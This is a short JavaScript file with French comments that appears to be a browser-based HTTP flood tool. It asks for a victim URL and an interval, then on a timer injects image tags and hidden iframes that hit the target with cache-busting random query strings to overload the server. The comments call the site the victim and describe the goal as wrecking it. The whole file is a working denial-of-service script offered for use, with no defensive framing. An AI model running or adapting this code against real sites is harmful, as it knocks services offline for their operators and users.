//Auteur original : https://github.com/ninja25538
//Modifications : Joshua Simoneau

//Demande à l'utilisateur l'URL victime
var target = prompt(" Url, add / to the end");
//Nbr de fois que l'attaque est exec par ms
var speed = prompt("Make request ever [blank] miliseconds");
//Msg au serveur
var msg = prompt("Message to HTTP server");

function attack() { 
    //Crée une balise image sur la page
    var pic = new Image();

    var rand1 = Math.floor(Math.random() * 99999999);
    var rand2 = Math.floor(Math.random() * 99999999);

    //REQUEST 1
    //Ajoute la source de l'image (la victime) + une requete GET php avec une val RAND
    pic.src = 'http://'+target+"/?r="+rand1;
    
    //REQUEST 2
    //Ajoute une balise iframe pointée sur la victime avec une requête GET
    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';

    document.body.insertAdjacentElement("beforeend", pic);

    //REQUEST 3
    //Décalisse encore plus le site

    var img = new Image();
     // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
    img.setAttribute("src", target + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);

    document.body.insertAdjacentElement("beforeend", img);

}

//Execute l'attaque selon le speed ind. par USER
setInterval(attack, speed);  